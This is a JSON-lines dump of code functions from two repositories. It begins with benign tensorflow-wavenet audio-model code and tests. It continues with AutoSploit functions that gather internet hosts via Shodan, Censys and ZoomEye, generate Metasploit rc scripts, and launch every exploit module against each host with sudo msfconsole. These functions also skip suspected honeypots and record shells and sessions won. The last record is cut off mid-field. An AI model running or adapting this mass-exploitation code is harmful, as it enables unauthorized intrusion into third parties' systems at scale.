{"docstring": "# Manual mu-law companding and mu-bits quantization\n", "func_signal": "def manual_mu_law_encode(signal, quantization_channels):\n", "code": "mu = quantization_channels - 1\n\nmagnitude = np.log1p(mu * np.abs(signal)) / np.log1p(mu)\nsignal = np.sign(signal) * magnitude\n\n# Map signal from [-1, +1] to [0, mu-1]\nsignal = (signal + 1) / 2 * mu + 0.5\nquantized_signal = signal.astype(np.int32)\n\nreturn quantized_signal", "path": "tensorflow-wavenet/test/test_mu_law.py", "commit_date": "2017-03-10 00:00:00", "repo_name": "ibab/tensorflow-wavenet", "stars": 5396, "license": "mit", "language": "python", "size": 335}
{"docstring": "'''Returns embedding for global condition.\n:param global_condition: Either ID of global condition for\n       tf.nn.embedding_lookup or actual embedding. The latter is\n       experimental.\n:return: Embedding or None\n'''\n", "func_signal": "def _embed_gc(self, global_condition):\n", "code": "embedding = None\nif self.global_condition_cardinality is not None:\n    # Only lookup the embedding if the global condition is presented\n    # as an integer of mutually-exclusive categories ...\n    embedding_table = self.variables['embeddings']['gc_embedding']\n    embedding = tf.nn.embedding_lookup(embedding_table,\n                                       global_condition)\nelif global_condition is not None:\n    # ... else the global_condition (if any) is already provided\n    # as an embedding.\n\n    # In this case, the number of global_embedding channels must be\n    # equal to the the last dimension of the global_condition tensor.\n    gc_batch_rank = len(global_condition.get_shape())\n    dims_match = (global_condition.get_shape()[gc_batch_rank - 1] ==\n                  self.global_condition_channels)\n    if not dims_match:\n        raise ValueError('Shape of global_condition {} does not'\n                         ' match global_condition_channels {}.'.\n                         format(global_condition.get_shape(),\n                                self.global_condition_channels))\n    embedding = global_condition\n\nif embedding is not None:\n    embedding = tf.reshape(\n        embedding,\n        [self.batch_size, 1, self.global_condition_channels])\n\nreturn embedding", "path": "tensorflow-wavenet/wavenet/model.py", "commit_date": "2018-04-06 00:00:00", "repo_name": "ibab/tensorflow-wavenet", "stars": 5396, "license": "mit", "language": "python", "size": 335}
{"docstring": "'''Quantizes waveform amplitudes.'''\n", "func_signal": "def mu_law_encode(audio, quantization_channels):\n", "code": "with tf.name_scope('encode'):\n    mu = tf.to_float(quantization_channels - 1)\n    # Perform mu-law companding transformation (ITU-T, 1988).\n    # Minimum operation is here to deal with rare large amplitudes caused\n    # by resampling.\n    safe_audio_abs = tf.minimum(tf.abs(audio), 1.0)\n    magnitude = tf.log1p(mu * safe_audio_abs) / tf.log1p(mu)\n    signal = tf.sign(audio) * magnitude\n    # Quantize signal to the specified number of levels.\n    return tf.to_int32((signal + 1) / 2 * mu + 0.5)", "path": "tensorflow-wavenet/wavenet/ops.py", "commit_date": "2017-03-10 00:00:00", "repo_name": "ibab/tensorflow-wavenet", "stars": 5396, "license": "mit", "language": "python", "size": 335}
{"docstring": "\"\"\"Tests that the op is equivalent to a numpy implementation.\"\"\"\n", "func_signal": "def testCausalConv(self):\n", "code": "x1 = np.arange(1, 21, dtype=np.float32)\nx = np.append(x1, x1)\nx = np.reshape(x, [2, 20, 1])\nf = np.reshape(np.array([1, 1], dtype=np.float32), [2, 1, 1])\nout = causal_conv(x, f, 4)\n\nwith self.test_session() as sess:\n    result = sess.run(out)\n\n# Causal convolution using numpy\nref = np.convolve(x1, [1, 0, 0, 0, 1], mode='valid')\nref = np.append(ref, ref)\nref = np.reshape(ref, [2, 16, 1])\n\nself.assertAllEqual(result, ref)", "path": "tensorflow-wavenet/test/test_causal_conv.py", "commit_date": "2016-11-27 00:00:00", "repo_name": "ibab/tensorflow-wavenet", "stars": 5396, "license": "mit", "language": "python", "size": 335}
{"docstring": "'''Recovers waveform from quantized values.'''\n", "func_signal": "def mu_law_decode(output, quantization_channels):\n", "code": "with tf.name_scope('decode'):\n    mu = quantization_channels - 1\n    # Map values back to [-1, 1].\n    signal = 2 * (tf.to_float(output) / mu) - 1\n    # Perform inverse of mu-law transformation.\n    magnitude = (1 / mu) * ((1 + mu)**abs(signal) - 1)\n    return tf.sign(signal) * magnitude", "path": "tensorflow-wavenet/wavenet/ops.py", "commit_date": "2017-03-10 00:00:00", "repo_name": "ibab/tensorflow-wavenet", "stars": 5396, "license": "mit", "language": "python", "size": 335}
{"docstring": "\"\"\"Convert string to bool (in argparse context).\"\"\"\n", "func_signal": "def _str_to_bool(s):\n", "code": "if s.lower() not in ['true', 'false']:\n    raise ValueError('Argument needs to be a '\n                     'boolean, got {}'.format(s))\nreturn {'true': True, 'false': False}[s.lower()]", "path": "tensorflow-wavenet/train.py", "commit_date": "2017-02-13 00:00:00", "repo_name": "ibab/tensorflow-wavenet", "stars": 5396, "license": "mit", "language": "python", "size": 335}
{"docstring": "'''Computes the probability distribution of the next sample based on\nall samples in the input waveform.\nIf you want to generate audio by feeding the output of the network back\nas an input, see predict_proba_incremental for a faster alternative.'''\n", "func_signal": "def predict_proba(self, waveform, global_condition=None, name='wavenet'):\n", "code": "with tf.name_scope(name):\n    if self.scalar_input:\n        encoded = tf.cast(waveform, tf.float32)\n        encoded = tf.reshape(encoded, [-1, 1])\n    else:\n        encoded = self._one_hot(waveform)\n\n    gc_embedding = self._embed_gc(global_condition)\n    raw_output = self._create_network(encoded, gc_embedding)\n    out = tf.reshape(raw_output, [-1, self.quantization_channels])\n    # Cast to float64 to avoid bug in TensorFlow\n    proba = tf.cast(\n        tf.nn.softmax(tf.cast(out, tf.float64)), tf.float32)\n    last = tf.slice(\n        proba,\n        [tf.shape(proba)[0] - 1, 0],\n        [1, self.quantization_channels])\n    return tf.reshape(last, [-1])", "path": "tensorflow-wavenet/wavenet/model.py", "commit_date": "2018-04-06 00:00:00", "repo_name": "ibab/tensorflow-wavenet", "stars": 5396, "license": "mit", "language": "python", "size": 335}
{"docstring": "'''One-hot encodes the waveform amplitudes.\n\nThis allows the definition of the network as a categorical distribution\nover a finite set of possible amplitudes.\n'''\n", "func_signal": "def _one_hot(self, input_batch):\n", "code": "with tf.name_scope('one_hot_encode'):\n    encoded = tf.one_hot(\n        input_batch,\n        depth=self.quantization_channels,\n        dtype=tf.float32)\n    shape = [self.batch_size, -1, self.quantization_channels]\n    encoded = tf.reshape(encoded, shape)\nreturn encoded", "path": "tensorflow-wavenet/wavenet/model.py", "commit_date": "2018-04-06 00:00:00", "repo_name": "ibab/tensorflow-wavenet", "stars": 5396, "license": "mit", "language": "python", "size": 335}
{"docstring": "'''Creates a single causal convolution layer.\n\nThe layer can change the number of channels.\n'''\n", "func_signal": "def _create_causal_layer(self, input_batch):\n", "code": "with tf.name_scope('causal_layer'):\n    weights_filter = self.variables['causal_layer']['filter']\n    return causal_conv(input_batch, weights_filter, 1)", "path": "tensorflow-wavenet/wavenet/model.py", "commit_date": "2018-04-06 00:00:00", "repo_name": "ibab/tensorflow-wavenet", "stars": 5396, "license": "mit", "language": "python", "size": 335}
{"docstring": "# generate every possible quantized level.\n", "func_signal": "def testDecodeEncode(self):\n", "code": "x = np.array(range(QUANT_LEVELS), dtype=np.int)\n\n# Encoded then decode every value.\nwith self.test_session() as sess:\n    # Decode into floating-point scalar.\n    decoded = mu_law_decode(x, QUANT_LEVELS)\n    # Encode back into an integer quantization level.\n    encoded = mu_law_encode(decoded, QUANT_LEVELS)\n    round_tripped = sess.run(encoded)\n\n# decoding then encoding every level should produce what we started\n# with.\nself.assertAllEqual(x, round_tripped)", "path": "tensorflow-wavenet/test/test_mu_law.py", "commit_date": "2017-03-10 00:00:00", "repo_name": "ibab/tensorflow-wavenet", "stars": 5396, "license": "mit", "language": "python", "size": 335}
{"docstring": "'''Create a convolution filter variable with the specified name and shape,\nand initialize it using Xavier initialition.'''\n", "func_signal": "def create_variable(name, shape):\n", "code": "initializer = tf.contrib.layers.xavier_initializer_conv2d()\nvariable = tf.Variable(initializer(shape=shape), name=name)\nreturn variable", "path": "tensorflow-wavenet/wavenet/model.py", "commit_date": "2018-04-06 00:00:00", "repo_name": "ibab/tensorflow-wavenet", "stars": 5396, "license": "mit", "language": "python", "size": 335}
{"docstring": "\"\"\"Validate and arrange directory related arguments.\"\"\"\n\n# Validation\n", "func_signal": "def validate_directories(args):\n", "code": "if args.logdir and args.logdir_root:\n    raise ValueError(\"--logdir and --logdir_root cannot be \"\n                     \"specified at the same time.\")\n\nif args.logdir and args.restore_from:\n    raise ValueError(\n        \"--logdir and --restore_from cannot be specified at the same \"\n        \"time. This is to keep your previous model from unexpected \"\n        \"overwrites.\\n\"\n        \"Use --logdir_root to specify the root of the directory which \"\n        \"will be automatically created with current date and time, or use \"\n        \"only --logdir to just continue the training from the last \"\n        \"checkpoint.\")\n\n# Arrangement\nlogdir_root = args.logdir_root\nif logdir_root is None:\n    logdir_root = LOGDIR_ROOT\n\nlogdir = args.logdir\nif logdir is None:\n    logdir = get_default_logdir(logdir_root)\n    print('Using default logdir: {}'.format(logdir))\n\nrestore_from = args.restore_from\nif restore_from is None:\n    # args.logdir and args.restore_from are exclusive,\n    # so it is guaranteed the logdir here is newly created.\n    restore_from = logdir\n\nreturn {\n    'logdir': logdir,\n    'logdir_root': args.logdir_root,\n    'restore_from': restore_from\n}", "path": "tensorflow-wavenet/train.py", "commit_date": "2017-02-13 00:00:00", "repo_name": "ibab/tensorflow-wavenet", "stars": 5396, "license": "mit", "language": "python", "size": 335}
{"docstring": "'''Create a bias variable with the specified name and shape and initialize\nit to zero.'''\n", "func_signal": "def create_bias_variable(name, shape):\n", "code": "initializer = tf.constant_initializer(value=0.0, dtype=tf.float32)\nreturn tf.Variable(initializer(shape=shape), name)", "path": "tensorflow-wavenet/wavenet/model.py", "commit_date": "2018-04-06 00:00:00", "repo_name": "ibab/tensorflow-wavenet", "stars": 5396, "license": "mit", "language": "python", "size": 335}
{"docstring": "'''Generate a few samples using the fast method and\nperform sanity checks on the output.'''\n", "func_signal": "def testGenerateFast(self):\n", "code": "waveform = tf.placeholder(tf.int32)\nnp.random.seed(0)\ndata = np.random.randint(128)\nproba = self.net.predict_proba_incremental(waveform)\n\nwith self.test_session() as sess:\n    sess.run(tf.global_variables_initializer())\n    sess.run(self.net.init_ops)\n    proba = sess.run(proba, feed_dict={waveform: data})\n\nself.assertAllEqual(proba.shape, [128])\nself.assertTrue(np.all((proba >= 0) & (proba <= (128 - 1))))", "path": "tensorflow-wavenet/test/test_generation.py", "commit_date": "2017-04-24 00:00:00", "repo_name": "ibab/tensorflow-wavenet", "stars": 5396, "license": "mit", "language": "python", "size": 335}
{"docstring": "\"\"\"\nExplanation:\n-----------\nLoad a custom exploit file, this is useful to attack already gathered hosts\ninstead of trying to gather them again from the backup host files inside\nof the `.autosploit_home` directory\n\nParameters:\n-----------\n:param file_path: the full path to the loadable hosts file\n\nCommand Format:\n--------------\ncustom[/personal] FILE_PATH\n\nExamples:\n---------\ncustom /some/path/to/myfile.txt\n\"\"\"\n", "func_signal": "def do_load_custom_hosts(self, file_path):\n", "code": "import shutil\n\ntry:\n    open(\"{}\".format(file_path)).close()\nexcept IOError:\n    lib.output.error(\"file does not exist, check the path and try again\")\n    return\nlib.output.warning(\"overwriting hosts file with provided, and backing up current\")\nbackup_path = lib.settings.backup_host_file(lib.settings.HOST_FILE, lib.settings.HOST_FILE_BACKUP)\nshutil.copy(file_path, lib.settings.HOST_FILE)\nlib.output.info(\"host file replaced, backup stored under '{}'\".format(backup_path))\nself.loaded_hosts = open(lib.settings.HOST_FILE).readlines()", "path": "AutoSploit/lib/term/terminal.py", "commit_date": "2019-09-04 00:00:00", "repo_name": "NullArray/AutoSploit", "stars": 4892, "license": "gpl-3.0", "language": "python", "size": 418}
{"docstring": "\"\"\"\nClean the hosts.txt file of any duplicate IP addresses\n\"\"\"\n", "func_signal": "def do_clean_hosts(self):\n", "code": "retval = set()\ncurrent_size = len(self.loaded_hosts)\nfor host in self.loaded_hosts:\n    retval.add(host)\ncleaned_size = len(retval)\nwith open(lib.settings.HOST_FILE, 'w') as hosts:\n    for item in list(retval):\n        hosts.write(item)\nif current_size != cleaned_size:\n    lib.output.info(\"cleaned {} duplicate IP address(es) (total of {})\".format(\n        current_size - cleaned_size, cleaned_size\n    )\n    )\nself.__reload()", "path": "AutoSploit/lib/term/terminal.py", "commit_date": "2019-09-04 00:00:00", "repo_name": "NullArray/AutoSploit", "stars": 4892, "license": "gpl-3.0", "language": "python", "size": 418}
{"docstring": "\"\"\"\nget the provided choice and return a tuple of options and the choice\n\"\"\"\n", "func_signal": "def get_choice(self):\n", "code": "original_choice = raw_input(lib.settings.AUTOSPLOIT_PROMPT)\ntry:\n    choice_checker = original_choice.split(\" \")[0]\nexcept:\n    choice_checker = original_choice\nif choice_checker in self.internal_terminal_commands:\n    retval = (\"internal\", original_choice)\nelif choice_checker in self.external_terminal_commands:\n    retval = (\"external\", original_choice)\nelse:\n    retval = (\"unknown\", original_choice)\nreturn retval", "path": "AutoSploit/lib/term/terminal.py", "commit_date": "2019-09-04 00:00:00", "repo_name": "NullArray/AutoSploit", "stars": 4892, "license": "gpl-3.0", "language": "python", "size": 418}
{"docstring": "\"\"\"\nExplanation:\n------------\nSearch the API with a provided query for potentially exploitable hosts.\n\nParameters:\n-----------\n:param requested_api_data: data to be used with the API tuple of info\n:param query: the query to be searched\n:param tokens: an argument dict that will contain the token information\n\nCommand Format:\n--------------\nsearch[/api/gather] API_NAME[API_NAME,...](shodan,censys,zoomeye) QUERY\n\nExamples:\n---------\nsearch shodan,censys,zoomeye windows 10\nsearch shodan windows 7\n\"\"\"\n", "func_signal": "def do_api_search(self, requested_api_data, query, tokens):\n", "code": "acceptable_api_names = (\"shodan\", \"censys\", \"zoomeye\")\napi_checker = lambda l: all(i.lower() in acceptable_api_names for i in l)\n\ntry:\n    if len(query) < 1:\n        query = \"\".join(query)\n    else:\n        query = \" \".join(query)\nexcept:\n    query = query\n\nif query == \"\" or query.isspace():\n    lib.output.warning(\"looks like you forgot the query\")\n    return\ntry:\n    api_list = requested_api_data.split(\",\")\nexcept:\n    api_list = [requested_api_data]\nprompt_for_save = len(open(lib.settings.HOST_FILE).readlines()) != 0\nif prompt_for_save:\n    save_mode = lib.output.prompt(\n        \"would you like to [a]ppend or [o]verwrite the file[a/o]\", lowercase=True\n    )\n    if save_mode.startswith(\"o\"):\n        backup = lib.settings.backup_host_file(lib.settings.HOST_FILE, lib.settings.HOST_FILE_BACKUP)\n        lib.output.misc_info(\"current host file backed up under: '{}'\".format(backup))\n        save_mode = \"w\"\n    else:\n        if not any(save_mode.startswith(s) for s in (\"a\", \"o\")):\n            lib.output.misc_info(\"provided option is not valid, defaulting to 'a'\")\n            save_mode = \"a+\"\nelse:\n    save_mode = \"a+\"\n\nproxy = lib.output.prompt(\"enter your proxy or press enter for none\", lowercase=False)\nif proxy.isspace() or proxy == \"\":\n    proxy = {\"http\": \"\", \"https\": \"\"}\nelse:\n    proxy = {\"http\": proxy, \"https\": proxy}\nagent = lib.output.prompt(\"use a [r]andom User-Agent or the [d]efault one[r/d]\", lowercase=True)\nif agent.startswith(\"r\"):\n    agent = {\"User-Agent\": lib.settings.grab_random_agent()}\nelif agent.startswith(\"d\"):\n    agent = {\"User-Agent\": lib.settings.DEFAULT_USER_AGENT}\nelse:\n    lib.output.warning(\"invalid option, using default\")\n    agent = {\"User-Agent\": lib.settings.DEFAULT_USER_AGENT}\nfor api in api_list:\n    res = api_checker([api])\n    if not res:\n        lib.output.error(\n            \"API: '{}' is not a valid API, will be skipped\".format(api)\n        )\n    else:\n        with open(lib.settings.QUERY_FILE_PATH, \"a+\") as tmp:\n            tmp.write(query)\n        lib.output.info(\n            \"starting search on API {} using query: '{}'\".format(api, query)\n        )\n        try:\n            self.api_call_pointers[api.lower()](\n                token=tokens[\"shodan\"][0] if api == \"shodan\" else tokens[\"censys\"][0],\n                identity=tokens[\"censys\"][1] if api == \"censys\" else \"\",\n                query=query,\n                save_mode=save_mode,\n                proxy=proxy,\n                agent=agent\n            ).search()\n        except (lib.errors.AutoSploitAPIConnectionError, Exception) as e:\n            lib.settings.stop_animation = True\n            lib.output.error(\"error searching API: '{}', error message: '{}'\".format(api, str(e)))\nlib.settings.stop_animation = True", "path": "AutoSploit/lib/term/terminal.py", "commit_date": "2019-09-04 00:00:00", "repo_name": "NullArray/AutoSploit", "stars": 4892, "license": "gpl-3.0", "language": "python", "size": 418}
{"docstring": "\"\"\"\nExplanation:\n------------\nExploit the already gathered hosts inside of the hosts.txt file\n\nParameters:\n-----------\n:param workspace_info: a tuple of workspace information\n\nCommand Format:\n--------------\nexploit[/run/attack] IP PORT WORKSPACE_NAME [whitewash list]\n\nExamples:\n---------\nexploit 127.0.0.1 9065 default whitelist.txt\n\"\"\"\n", "func_signal": "def do_exploit_targets(self, workspace_info, shodan_token=None):\n", "code": "if workspace_info[3] is not None and workspace_info[3] != \"honeycheck\":\n    lib.output.misc_info(\"doing whitewash on hosts file\")\n    lib.exploitation.exploiter.whitelist_wash(\n        open(lib.settings.HOST_FILE).readlines(),\n        workspace_info[3]\n    )\nelse:\n    if not lib.settings.check_for_msf():\n        msf_path = lib.output.prompt(\n            \"metasploit is not in your PATH, provide the full path to it\", lowercase=False\n        )\n        ruby_exec = True\n    else:\n        msf_path = None\n        ruby_exec = False\n\n    sort_mods = lib.output.prompt(\n        \"sort modules by relevance to last query[y/N]\", lowercase=True\n    )\n\n    try:\n        if sort_mods.lower().startswith(\"y\"):\n            mods_to_use = lib.exploitation.exploiter.AutoSploitExploiter(\n                None, None\n            ).sort_modules_by_query()\n        else:\n            mods_to_use = self.modules\n    except Exception:\n        lib.output.error(\"error sorting modules defaulting to all\")\n        mods_to_use = self.modules\n\n    view_modules = lib.output.prompt(\"view sorted modules[y/N]\", lowercase=True)\n    if view_modules.startswith(\"y\"):\n        for mod in mods_to_use:\n            lib.output.misc_info(mod.strip())\n    lib.output.prompt(\"press enter to start exploitation phase\")\n    lib.output.info(\"starting exploitation phase\")\n    lib.exploitation.exploiter.AutoSploitExploiter(\n        configuration=workspace_info[0:3],\n        all_modules=mods_to_use,\n        hosts=open(lib.settings.HOST_FILE).readlines(),\n        msf_path=msf_path,\n        ruby_exec=ruby_exec,\n        check_honey=workspace_info[-1],\n        shodan_token=shodan_token\n    ).start_exploit()", "path": "AutoSploit/lib/term/terminal.py", "commit_date": "2019-09-04 00:00:00", "repo_name": "NullArray/AutoSploit", "stars": 4892, "license": "gpl-3.0", "language": "python", "size": 418}
{"docstring": "\"\"\"\nparse the provided arguments to make sure that they are all compatible with one another\n\"\"\"\n", "func_signal": "def parse_provided(opt):\n", "code": "parser = any([opt.searchAll, opt.searchZoomeye, opt.searchCensys, opt.searchShodan])\n\nif opt.rubyExecutableNeeded and opt.pathToFramework is None:\n    lib.settings.close(\"if the Ruby exec is needed, so is the path to metasploit, pass the `--msf-path` switch\")\nif opt.pathToFramework is not None and not opt.rubyExecutableNeeded:\n    lib.settings.close(\n        \"if you need the metasploit path, you also need the ruby executable. pass the `--ruby-exec` switch\"\n    )\nif opt.personalAgent is not None and opt.randomAgent:\n    lib.settings.close(\"you cannot use both a personal agent and a random agent, choose only one\")\nif parser and opt.searchQuery is None:\n    lib.settings.close(\"must provide a search query with the `-q/--query` switch\")\nif not parser and opt.searchQuery is not None:\n    lib.settings.close(\n        \"you provided a query and no search engine, choose one with `-s/--shodan/-z/--zoomeye/-c/--censys` \"\n        \"or all with `-a/--all`\"\n    )\nif opt.startExploit and opt.msfConfig is None:\n    lib.settings.close(\n        \"you must provide the configuration for metasploit in order to start the exploits \"\n        \"do so by passing the `-C\\--config` switch (IE -C default 127.0.0.1 8080). don't be \"\n        \"an idiot and keep in mind that sending connections back to your localhost is \"\n        \"probably not a good idea\"\n    )\nif not opt.startExploit and opt.msfConfig is not None:\n    lib.settings.close(\n        \"you have provided configuration without attempting to exploit, you must pass the \"\n        \"`-e/--exploit` switch to start exploiting\"\n    )", "path": "AutoSploit/lib/cmdline/cmd.py", "commit_date": "2019-06-27 00:00:00", "repo_name": "NullArray/AutoSploit", "stars": 4892, "license": "gpl-3.0", "language": "python", "size": 418}
{"docstring": "\"\"\"\nstart the exploit, there is still no rollover but it's being worked\n\"\"\"\n", "func_signal": "def start_exploit(self, sep=\"*\" * 10):\n", "code": "if self.dry_run:\n    lib.settings.close(\"dry run was initiated, exploitation will not be done\")\n\ntoday_printable = datetime.datetime.today().strftime(\"%Y-%m-%d_%Hh%Mm%Ss\")\ncurrent_run_path = path.join(lib.settings.RC_SCRIPTS_PATH, today_printable)\ntry:\n    makedirs(current_run_path)\nexcept OSError:\n    current_run_path = path.join(lib.settings.RC_SCRIPTS_PATH, today_printable + \"(1)\")\n    makedirs(current_run_path)\n\nreport_path = path.join(current_run_path, \"report.csv\")\nwith open(report_path, 'w') as f:\n    csv_file = csv.writer(f, quoting=csv.QUOTE_ALL)\n    csv_file.writerow(\n        [\n            'Target Host', 'Date (UTC)', 'MSF Module',\n            \"LocalHost\", \"Listening Port\", \"Successful Logs\",\n            \"Failure Logs\", \"All Logs\"\n        ]\n    )\n\nlib.output.info(\"Launching exploits against {hosts_len} hosts:\".format(hosts_len=len(self.hosts)))\n\nwin_total = 0\nfail_total = 0\nskip_amount = 0\nlib.settings.MSF_LAUNCHED = True\n\nfor host in self.hosts:\n    host = host.strip()\n    if self.check_honey:\n        lib.output.misc_info(\"checking if {} is a honeypot\".format(host))\n        honey_score = api_calls.honeyscore_hook.HoneyHook(host, self.shodan_token).make_request()\n        if honey_score < self.compare_honey:\n            lib.output.warning(\n                \"honeypot score ({}) is above (or equal to) requested, skipping target\".format(honey_score)\n            )\n            skip = True\n            skip_amount += 1\n        else:\n            lib.output.misc_info(\"{} does not appear to be a honeypot, continuing attack\".format(host))\n            skip = False\n    else:\n        skip = False\n\n    if not skip:\n        current_host_path = path.join(current_run_path, host.strip())\n        try:\n            makedirs(current_host_path)\n        except OSError:\n            pass\n\n        for mod in self.mods:\n            if not self.dry_run:\n                lib.output.info(\n                    \"launching exploit '{}' against host '{}'\".format(\n                        mod.strip(), host.strip()\n                    )\n                )\n\n            cmd_template = (\n                \"sudo {use_ruby} {msf_path} -r {rc_script_path} -q\"\n            )\n\n            use_ruby = \"ruby\" if self.ruby_exec else \"\"\n            msf_path = self.msf_path if self.msf_path is not None else \"msfconsole\"\n\n            # What's the point of having a workspace if you overwrite it every fucking time..\n            rc_script_template = (\n                \"workspace -a {workspace}\\n\"\n                \"use {module_name}\\n\"\n                \"setg lhost {lhost}\\n\"\n                \"setg lport {lport}\\n\"\n                \"setg verbose true\\n\"\n                \"setg threads 20\\n\"\n                \"set rhost {rhost}\\n\"\n                \"set rhosts {rhosts}\\n\"\n                \"run -z\\n\"\n                \"exit -y\\n\"\n            )\n\n            module_name = mod.strip()\n            workspace = self.configuration[0]\n            lhost = self.configuration[1]\n            lport = self.configuration[2]\n            rhost = host.strip()\n\n            current_rc_script_path = path.join(current_host_path, mod.replace(\"/\", '-').strip())\n            with open(current_rc_script_path, 'w') as f:\n\n                f.writelines(rc_script_template.format(\n                    module_name=module_name,\n                    workspace=workspace,\n                    lhost=lhost,\n                    lport=lport,\n                    rhost=rhost,\n                    rhosts=rhost\n                ))\n\n            with open(report_path, 'a') as f:\n\n                cmd = cmd_template.format(\n                    use_ruby=use_ruby,\n                    msf_path=msf_path,\n                    rc_script_path=current_rc_script_path\n                )\n\n                output = [\"\"]\n                if not self.dry_run:\n                    output = lib.settings.cmdline(cmd)\n\n                ansi_escape = re.compile(r'\\x1B\\[[0-?]*[ -/]*[@-~]')\n                msf_output_lines = [ansi_escape.sub('', x) for x in output if re.search('\\[.\\]', x)]\n\n                msf_wins = [\n                    x for x in msf_output_lines if re.search('\\[\\+\\]', x) or\n                                                   'Meterpreter' in x or 'Session' in x or 'Sending stage' in x\n                ]\n                msf_fails = [x for x in msf_output_lines if re.search('\\[-\\]', x) and 'Background' not in x]\n\n                if len(msf_wins):\n                    win_total += 1\n                if len(msf_fails):\n                    fail_total += 1\n\n                csv_file = csv.writer(f, quoting=csv.QUOTE_ALL)\n                csv_file.writerow([\n                        rhost, today_printable, module_name, lhost, lport,\n                        linesep.join(msf_wins), linesep.join(msf_fails), linesep.join(msf_output_lines)\n                     ])\n\nprint(\"\")\nlib.output.info(\"{}RESULTS{}\".format(sep, sep))\n\nif self.dry_run:\n    lib.output.info(\"\\tDRY RUN!\")\n    lib.output.info(\"\\t0 exploits run against {} hosts.\".format(len(self.hosts)))\nelse:\n    lib.output.info(\"\\t{} exploits run against {} hosts.\".format(len(self.mods), len(self.hosts) - skip_amount))\n    lib.output.info(\"\\t{} exploit successful (Check report.csv to validate!).\".format(win_total))\n    lib.output.info(\"\\t{} exploit failed.\".format(fail_total))\n\nlib.output.info(\"\\tExploit run saved to {}\".format(str(current_run_path)))\nlib.output.info(\"\\tReport saved to {}\".format(str(report_path)))", "path": "AutoSploit/lib/exploitation/exploiter.py", "commit_date": "2019-09-03 00:00:00", "repo_name": "NullArray/AutoSploit", "stars": 4892, "license": "gpl-3.0", "language": "python", "size": 418}
{"docstring": "\"\"\"\ndisplay the history from the history files\n\"\"\"\n", "func_signal": "def do_display_history(self):\n", "code": "for i, item in enumerate(self.history, start=1):\n    if len(list(str(i))) == 2:\n        spacer1, spacer2 = \"  \", \"   \"\n    elif len(list(str(i))) == 3:\n        spacer1, spacer2 = \" \", \"   \"\n    else:\n        spacer1, spacer2 = \"   \", \"   \"\n    print(\"{}{}{}{}\".format(spacer1, i, spacer2, item))", "path": "AutoSploit/lib/term/terminal.py", "commit_date": "2019-09-04 00:00:00", "repo_name": "NullArray/AutoSploit", "stars": 4892, "license": "gpl-3.0", "language": "python", "size": 418}
{"docstring": "\"\"\"\nrun the arguments provided\n\"\"\"\n", "func_signal": "def single_run_args(opt, keys, loaded_modules):\n", "code": "api_searches = (\n    api_calls.zoomeye.ZoomEyeAPIHook,\n    api_calls.shodan.ShodanAPIHook,\n    api_calls.censys.CensysAPIHook\n)\nheaders = lib.settings.configure_requests(\n    proxy=opt.proxyConfig, agent=opt.personalAgent, rand_agent=opt.randomAgent\n)\nsingle_search_msg = \"using {} as the search engine\"\n\nif opt.displayEthics:\n    ethics_file = \"{}/etc/text_files/ethics.lst\".format(os.getcwd())\n    with open(ethics_file) as ethics:\n        ethic = random.choice(ethics.readlines()).strip()\n        lib.settings.close(\n            \"You should take this ethical lesson into consideration \"\n            \"before you continue with the use of this tool:\\n\\n{}\\n\".format(ethic))\nif opt.downloadModules is not None:\n    import re\n\n    modules_to_download = opt.downloadModules\n    links_list = \"{}/etc/text_files/links.txt\".format(lib.settings.CUR_DIR)\n    possibles = open(links_list).readlines()\n    for module in modules_to_download:\n        searcher = re.compile(\"{}\".format(module))\n        for link in possibles:\n            if searcher.search(link) is not None:\n                filename = lib.settings.download_modules(link.strip())\n                download_filename = \"{}.json\".format(link.split(\"/\")[-1].split(\".\")[0])\n                download_path = \"{}/etc/json\".format(os.getcwd())\n                current_files = os.listdir(download_path)\n                if download_filename not in current_files:\n                    full_path = \"{}/{}\".format(download_path, download_filename)\n                    lib.jsonize.text_file_to_dict(filename, filename=full_path)\n                    lib.output.info(\"downloaded into: {}\".format(download_path))\n                else:\n                    lib.output.warning(\"file already downloaded, skipping\")\nif opt.exploitList:\n    try:\n        lib.output.info(\"converting {} to JSON format\".format(opt.exploitList))\n        done = lib.jsonize.text_file_to_dict(opt.exploitList)\n        lib.output.info(\"converted successfully and saved under {}\".format(done))\n    except IOError as e:\n        lib.output.error(\"caught IOError '{}' check the file path and try again\".format(str(e)))\n    sys.exit(0)\n\nsearch_save_mode = None\nif opt.overwriteHosts:\n    # Create a new empty file, overwriting the previous one.\n    # Set the mode to append afterwards\n    # This way, successive searches will start clean without\n    # overriding each others.\n    open(lib.settings.HOST_FILE, mode=\"w\").close()\n    search_save_mode = \"a\"\nelif opt.appendHosts:\n    search_save_mode = \"a\"\n\n# changed my mind it's not to bad\nif opt.searchCensys:\n    lib.output.info(single_search_msg.format(\"Censys\"))\n    api_searches[2](\n        keys[\"censys\"][1], keys[\"censys\"][0],\n        opt.searchQuery, proxy=headers[0], agent=headers[1],\n        save_mode=search_save_mode\n    ).search()\nif opt.searchZoomeye:\n    lib.output.info(single_search_msg.format(\"Zoomeye\"))\n    api_searches[0](\n        opt.searchQuery, proxy=headers[0], agent=headers[1],\n        save_mode=search_save_mode\n    ).search()\nif opt.searchShodan:\n    lib.output.info(single_search_msg.format(\"Shodan\"))\n    api_searches[1](\n        keys[\"shodan\"][0], opt.searchQuery, proxy=headers[0], agent=headers[1],\n        save_mode=search_save_mode\n    ).search()\nif opt.searchAll:\n    lib.output.info(\"searching all search engines in order\")\n    api_searches[0](\n        opt.searchQuery, proxy=headers[0], agent=headers[1],\n        save_mode=search_save_mode\n    ).search()\n    api_searches[1](\n        keys[\"shodan\"][0], opt.searchQuery, proxy=headers[0], agent=headers[1],\n        save_mode=search_save_mode\n    ).search()\n    api_searches[2](\n        keys[\"censys\"][1], keys[\"censys\"][0], opt.searchQuery, proxy=headers[0], agent=headers[1],\n        save_mode=search_save_mode\n    ).search()\nif opt.startExploit:\n    hosts = open(lib.settings.HOST_FILE).readlines()\n    if opt.whitelist:\n        hosts = lib.exploitation.exploiter.whitelist_wash(hosts, whitelist_file=opt.whitelist)\n    if opt.checkIfHoneypot != 1000:\n        check_pot = True\n    else:\n        check_pot = False\n    lib.exploitation.exploiter.AutoSploitExploiter(\n        opt.msfConfig,\n        loaded_modules,\n        hosts,\n        ruby_exec=opt.rubyExecutableNeeded,\n        msf_path=opt.pathToFramework,\n        dryRun=opt.dryRun,\n        shodan_token=keys[\"shodan\"][0],\n        check_honey=check_pot,\n        compare_honey=opt.checkIfHoneypot\n    ).start_exploit()", "path": "AutoSploit/lib/cmdline/cmd.py", "commit_date": "2019-06-27 00:00:00", "repo_name": "NullArray/AutoSploit", "stars": 4892, "license": 